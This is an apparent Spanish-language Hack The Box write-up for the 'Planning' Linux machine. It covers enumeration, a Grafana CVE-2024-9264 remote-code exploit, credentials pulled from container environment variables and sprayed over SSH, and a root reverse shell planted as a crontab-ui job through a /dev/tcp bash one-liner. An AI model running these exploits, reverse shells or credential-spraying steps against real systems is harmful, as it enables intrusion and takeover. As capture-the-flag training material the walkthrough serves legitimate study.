# HTB: 

## Host: Linux
## IP: {IP}

## Procedimiento y comandos

Se nos proveen las credenciales de esta maquina

User: **admin**
Password: **0D5oT70Fq13EvB5r**

#### Paso 1: Enumeracion

* Nmap

```bash
# Nmap 7.95 scan initiated Thu Sep 11 23:38:51 2025 as: /usr/lib/nmap/nmap -A -oN Planning-nmap.txt 10.10.11.68
Nmap scan report for 10.10.11.68
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://planning.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT       ADDRESS
1   194.76 ms 10.10.14.1
2   194.91 ms 10.10.11.68

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 11 23:39:14 2025 -- 1 IP address (1 host up) scanned in 23.52 seconds
```

* Feroxbuster

```bash
feroxbuster -u http://planning.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt --dont-filter --status-codes 200,204,301,302,307,403,401 --threads 50
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher ðŸ¤“                 ver: 2.11.0
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ðŸŽ¯  Target Url            â”‚ http://planning.htb
 ðŸš€  Threads               â”‚ 50
 ðŸ“–  Wordlist              â”‚ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 ðŸ‘Œ  Status Codes          â”‚ [200, 204, 301, 302, 307, 403, 401]
 ðŸ’¥  Timeout (secs)        â”‚ 7
 ðŸ¦¡  User-Agent            â”‚ feroxbuster/2.11.0
 ðŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml
 ðŸ”Ž  Extract Links         â”‚ true
 ðŸ’²  Extensions            â”‚ [php, html, txt]
 ðŸ  HTTP methods          â”‚ [GET]
 ðŸ¤ª  Filter Wildcards      â”‚ false
 ðŸ”ƒ  Recursion Depth       â”‚ 4
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ðŸ  Press [ENTER] to use the Scan Management Menuâ„¢
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
301      GET        7l       12w      178c http://planning.htb/img => http://planning.htb/img/
301      GET        7l       12w      178c http://planning.htb/js => http://planning.htb/js/
301      GET        7l       12w      178c http://planning.htb/css => http://planning.htb/css/
200      GET      201l      663w    10632c http://planning.htb/contact.php
200      GET       11l       56w     2406c http://planning.htb/lib/counterup/counterup.min.js
200      GET        1l       38w     2303c http://planning.htb/lib/easing/easing.min.js
200      GET        6l       64w     2936c http://planning.htb/lib/owlcarousel/assets/owl.carousel.min.css
200      GET       21l      212w    20494c http://planning.htb/img/team-3.jpg
200      GET      194l      674w    10229c http://planning.htb/course.php
200      GET      220l      880w    13006c http://planning.htb/detail.php
200      GET        5l       89w     5527c http://planning.htb/img/testimonial-2.jpg
200      GET        8l       58w     5269c http://planning.htb/img/testimonial-1.jpg
200      GET        7l      158w     9028c http://planning.htb/lib/waypoints/waypoints.min.js
200      GET      137l      234w     3338c http://planning.htb/js/main.js
200      GET      230l      874w    12727c http://planning.htb/about.php
200      GET      136l      656w    53333c http://planning.htb/img/courses-3.jpg
200      GET       63l      389w    30916c http://planning.htb/img/team-1.jpg
403      GET        7l       10w      162c http://planning.htb/lib/waypoints/
200      GET       60l      404w    29126c http://planning.htb/img/team-2.jpg
200      GET      420l     1623w    23914c http://planning.htb/index.php
200      GET      128l      607w    48746c http://planning.htb/img/courses-2.jpg
200      GET        7l      279w    42766c http://planning.htb/lib/owlcarousel/owl.carousel.min.js
301      GET        7l       12w      178c http://planning.htb/lib => http://planning.htb/lib/
403      GET        7l       10w      162c http://planning.htb/lib/owlcarousel/
200      GET      103l      772w    55609c http://planning.htb/img/about.jpg
200      GET      173l      851w    64663c http://planning.htb/img/courses-1.jpg
200      GET      146l      790w    75209c http://planning.htb/img/feature.jpg
403      GET        7l       10w      162c http://planning.htb/lib/counterup/
200      GET     9966l    19218w   183895c http://planning.htb/css/style.css
200      GET      420l     1623w    23914c http://planning.htb/
301      GET        7l       12w      178c http://planning.htb/lib/owlcarousel/assets => http://planning.htb/lib/owlcarousel/assets/
200      GET        0l        0w        0c http://planning.htb/lib/waypoints/links.php
403      GET        7l       10w      162c http://planning.htb/lib/easing/
403      GET        7l       10w      162c http://planning.htb/lib/
403      GET        7l       10w      162c http://planning.htb/lib/owlcarousel/assets/
200      GET      156l      543w     7053c http://planning.htb/enroll.php
200      GET      432l     2255w   160279c http://planning.htb/img/header.jpg
301      GET        7l       12w      178c http://planning.htb/img => http://planning.htb/img/                                                                                                                    301      GET        7l       12w      178c http://planning.htb/js => http://planning.htb/js/                                                                                                                      301      GET        7l       12w      178c http://planning.htb/css => http://planning.htb/css/                                                                                                                    200      GET      201l      663w    10632c http://planning.htb/contact.php                                                                                                                                        200      GET       11l       56w     2406c http://planning.htb/lib/counterup/counterup.min.js                                                                                                                     200      GET        1l       38w     2303c http://planning.htb/lib/easing/easing.min.js                                                                                                                           200      GET        6l       64w     2936c http://planning.htb/lib/owlcarousel/assets/owl.carousel.min.css                                                                                                        200      GET       21l      212w    20494c http://planning.htb/img/team-3.jpg                                                                                                                                     200      GET      194l      674w    10229c http://planning.htb/course.php                                                                                                                                         200      GET      220l      880w    13006c http://planning.htb/detail.php                                                                                                                                         200      GET        5l       89w     5527c http://planning.htb/img/testimonial-2.jpg                                                                                                                              200      GET        8l       58w     5269c http://planning.htb/img/testimonial-1.jpg                                                                                                                              200      GET        7l      158w     9028c http://planning.htb/lib/waypoints/waypoints.min.js                                                                                                                     200      GET      137l      234w     3338c http://planning.htb/js/main.js                                                                                                                                         200      GET      230l      874w    12727c http://planning.htb/about.php                                                                                                                                          200      GET      136l      656w    53333c http://planning.htb/img/courses-3.jpg                                                                                                                                  200      GET       63l      389w    30916c http://planning.htb/img/team-1.jpg                                                                                                                                     403      GET        7l       10w      162c http://planning.htb/lib/waypoints/                                                                                                                                     200      GET       60l      404w    29126c http://planning.htb/img/team-2.jpg                                                                                                                                     200      GET      420l     1623w    23914c http://planning.htb/index.php                                                                                                                                          200      GET      128l      607w    48746c http://planning.htb/img/courses-2.jpg                                                                                                                                  200      GET        7l      279w    42766c http://planning.htb/lib/owlcarousel/owl.carousel.min.js                                                                                                                301      GET        7l       12w      178c http://planning.htb/lib => http://planning.htb/lib/                                                                                                                    403      GET        7l       10w      162c http://planning.htb/lib/owlcarousel/                                                                                                                                   200      GET      103l      772w    55609c http://planning.htb/img/about.jpg                                                                                                                                      200      GET      173l      851w    64663c http://planning.htb/img/courses-1.jpg                                                                                                                                  200      GET      146l      790w    75209c http://planning.htb/img/feature.jpg                                                                                                                                    403      GET        7l       10w      162c http://planning.htb/lib/counterup/                                                                                                                                     200      GET     9966l    19218w   183895c http://planning.htb/css/style.css                                                                                                                                      200      GET      420l     1623w    23914c http://planning.htb/                                                                                                                                                   301      GET        7l       12w      178c http://planning.htb/lib/owlcarousel/assets => http://planning.htb/lib/owlcarousel/assets/                                                                              200      GET        0l        0w        0c http://planning.htb/lib/waypoints/links.php                                                                                                                            403      GET        7l       10w      162c http://planning.htb/lib/easing/                                                                                                                                        403      GET        7l       10w      162c http://planning.htb/lib/                                                                                                                                               403      GET        7l       10w      162c http://planning.htb/lib/owlcarousel/assets/                                                                                                                            200      GET      156l      543w     7053c http://planning.htb/enroll.php                                                                                                                                         200      GET      432l     2255w   160279c http://planning.htb/img/header.jpg                                                                                                                                     [####################] - 8m   1063496/1063496 0s      found:37      errors:0      

[####################] - 8m    106336/106336  228/s   http://planning.htb/ 
[####################] - 8m    106336/106336  229/s   http://planning.htb/img/ 
[####################] - 8m    106336/106336  229/s   http://planning.htb/js/ 
[####################] - 8m    106336/106336  229/s   http://planning.htb/css/ 
[####################] - 8m    106336/106336  228/s   http://planning.htb/lib/easing/ 
[####################] - 8m    106336/106336  228/s   http://planning.htb/lib/owlcarousel/assets/ 
[####################] - 8m    106336/106336  229/s   http://planning.htb/lib/counterup/ 
[####################] - 8m    106336/106336  228/s   http://planning.htb/lib/ 
[####################] - 8m    106336/106336  229/s   http://planning.htb/lib/waypoints/ 
[####################] - 8m    106336/106336  230/s   http://planning.htb/lib/owlcarousel/
```

* FUFF: Buscamos hosts virtuales

```bash
ï’µ  ffuf -w /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt -H "Host: FUZZ.planning.htb" -u http://planning.htb -fs 178

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://planning.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt
 :: Header           : Host: FUZZ.planning.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 438ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Despues de varios minutos de enumeracion lo unico interesante fue el el vhost ** grafana **

luego de agregar el vhost en /etc/hosts ingresamos por el navegador http://grafana.planning.htb ingresamos con las credenciales

En el panel de grafana buscamos la version: **Grafana v11.0.0 (83b9528bce)** y procedemos a buscar un exploit

[Exploit CVE-2024-9264](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit)

#### Paso 2: Acceso inicial

1. Descargamos y ejecutamos el exploit con un receptor nc activo

```bash
python3 poc.py --url http://grafana.planning.htb --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.14.218 --reverse-port 4444
[SUCCESS] Login successful!
Reverse shell payload sent successfully!
Set up a netcat listener on 4444
Failed to trigger reverse shell: 504 <html>
<head><title>504 Gateway Time-out</title></head>
<body>
<center><h1>504 Gateway Time-out</h1></center>
<hr><center>nginx/1.24.0 (Ubuntu)</center>
</body>
</html>
```

2. Receptor

```bash
nc -lvnp 4444                   
listening on [any] 4444 ...
connect to [10.10.14.218] from (UNKNOWN) [10.10.11.68] 41900
sh: 0: can't access tty; job control turned off
# whoami
root
# find /home -type f -name '*.txt' 2>/dev/null
# 
```

* Si bien obtenemos un terminal como root, los flags evidentemente no estan en esta maquina lo cual es una invitacion a movernos lateralmente.

#### Paso 3: Movimiento lateral

Luego de buscar credenciales en los archivos con find y grep sin llegar a nada interesante vemos en las variables de entorno lo siguiente:

```bash
oot@7ce659d667d7:/var/lib/grafana# env                                                                                                                                                                           
env                                                                                                                                                                                                               
SHELL=/bin/bash                                                                                                                                                                                                   
AWS_AUTH_SESSION_DURATION=15m                                                                                                                                                                                     
HOSTNAME=7ce659d667d7                                                                                                                                                                                             
PWD=/var/lib/grafana                                                                                                                                                                                              
AWS_AUTH_AssumeRoleEnabled=true                                                                                                                                                                                   
GF_PATHS_HOME=/usr/share/grafana                                                                                                                                                                                  
AWS_CW_LIST_METRICS_PAGE_LIMIT=500                                                                                                                                                                                
HOME=/usr/share/grafana                                                                                                                                                                                           
AWS_AUTH_EXTERNAL_ID=
SHLVL=2
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_LOGS=/var/log/grafana
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
OLDPWD=/home/grafana
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
_=/usr/bin/env
```

1. Agregamos las nuevas credenciales pass: **RioTecRANDEntANT!** user: **enzo** a nuestros archivos pass.txt y users.txt y propagamos con nxc:

```bash
nxc ssh 10.10.11.68 -u users.txt -p pass.txt --continue-on-success 
SSH         10.10.11.68     22     10.10.11.68      [*] SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.11
SSH         10.10.11.68     22     10.10.11.68      [-] admin:0D5oT70Fq13EvB5r
SSH         10.10.11.68     22     10.10.11.68      [-] enzo:0D5oT70Fq13EvB5r
SSH         10.10.11.68     22     10.10.11.68      [-] admin:RioTecRANDEntANT!
SSH         10.10.11.68     22     10.10.11.68      [+] enzo:RioTecRANDEntANT!  Linux - Shell access!
```

2. Accedemos por ssh con el usuario enzo:

```bash
>_ ssh enzo@10.10.11.68                             
enzo@10.10.11.68's password: RioTecRANDEntANT!
...

enzo@planning:~$ env
SHELL=/bin/bash
PWD=/home/enzo
LOGNAME=enzo
XDG_SESSION_TYPE=tty
HOME=/home/enzo
LANG=en_US.UTF-8
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=00:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.avif=01;35:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:*~=00;90:*#=00;90:*.bak=00;90:*.crdownload=00;90:*.dpkg-dist=00;90:*.dpkg-new=00;90:*.dpkg-old=00;90:*.dpkg-tmp=00;90:*.old=00;90:*.orig=00;90:*.part=00;90:*.rej=00;90:*.rpmnew=00;90:*.rpmorig=00;90:*.rpmsave=00;90:*.swp=00;90:*.tmp=00;90:*.ucf-dist=00;90:*.ucf-new=00;90:*.ucf-old=00;90:
SSH_CONNECTION=10.10.14.218 58852 10.10.11.68 22
LESSCLOSE=/usr/bin/lesspipe %s %s
XDG_SESSION_CLASS=user
TERM=xterm-256color
LESSOPEN=| /usr/bin/lesspipe %s
USER=enzo
SHLVL=1
XDG_SESSION_ID=72
XDG_RUNTIME_DIR=/run/user/1000
SSH_CLIENT=10.10.14.218 58852 22
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
SSH_TTY=/dev/pts/1
_=/usr/bin/env
enzo@planning:~$ sudo -l
[sudo] password for enzo: 
Sorry, user enzo may not run sudo on planning.
enzo@planning:~$ sudo -V
Sudo version 1.9.15p5
Sudoers policy plugin version 1.9.15p5
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.15p5
Sudoers audit plugin version 1.9.15p5
enzo@planning:~$ pwd
/home/enzo
enzo@planning:~$ ls -la
total 32
drwxr-x--- 4 enzo enzo 4096 Apr  3 13:49 .
drwxr-xr-x 3 root root 4096 Feb 28  2025 ..
lrwxrwxrwx 1 root root    9 Feb 28  2025 .bash_history -> /dev/null
-rw-r--r-- 1 enzo enzo  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 enzo enzo 3771 Mar 31  2024 .bashrc
drwx------ 2 enzo enzo 4096 Apr  3 13:49 .cache
-rw-r--r-- 1 enzo enzo  807 Mar 31  2024 .profile
drwx------ 2 enzo enzo 4096 Feb 28  2025 .ssh
-rw-r----- 1 root enzo   33 Sep 12 15:41 user.txt
enzo@planning:~$ cat user.txt
dd7044d588dd84eb0702f0edfdce47d2
```
#### Escalada de privilegios

1. Revisamos Servicios y conexiones:

```bash
enzo@planning:~$ netstat -tulnp 
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33591         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.54:53           0.0.0.0:*                           -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
```
2. Establecemos portforwarding ssh

```bash
ï’µ  ssh -L 8000:127.0.0.1:8000 -N -f enzo@10.10.11.68
enzo@10.10.11.68's password: RioTecRANDEntANT!
```
3. Buscamos arvhivos con .db

```bash
enzo@planning:~$ find / -type f -name '*.db' 2>/dev/null
/var/lib/command-not-found/commands.db
/var/lib/fwupd/pending.db
/var/lib/PackageKit/transactions.db
/usr/lib/firmware/regulatory.db
/usr/lib/node_modules/crontab-ui/crontabs/backup Fri Feb 28 2025 20:27:11 GMT 0000 (Coordinated Universal Time).db
/usr/lib/node_modules/crontab-ui/crontabs/env.db
/usr/lib/node_modules/crontab-ui/crontabs/crontab.db
/usr/lib/node_modules/crontab-ui/crontabs/backup Fri Feb 28 2025 20:33:29 GMT 0000 (Coordinated Universal Time).db
/opt/crontabs/crontab.db

enzo@planning:/opt/crontabs$ cat crontab.db 
{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
```
En este archivo hay un password: **P4ssw0rdS0pRi0T3c** intentamos con distintos nombres: admin, enzo, grafana, root

En el panel de crontab generamos otro job y en el input command colocamos nuestro payload:

```bash
/bin/bash -c "bash -i >& /dev/tcp/10.10.14.218/4445 0>&1"
```

Ejecutamos.

4. Levantamos un receptor:

```bash
ï’µ  nc -lvnp 4445
listening on [any] 4445 ...
connect to [10.10.14.218] from (UNKNOWN) [10.10.11.68] 53216
bash: cannot set terminal process group (1269): Inappropriate ioctl for device
bash: no job control in this shell
root@planning:/# cat /root/root.txt
cat /root/root.txt
983164b5698a61d77b8bc8859c42eada
root@planning:/# 
```
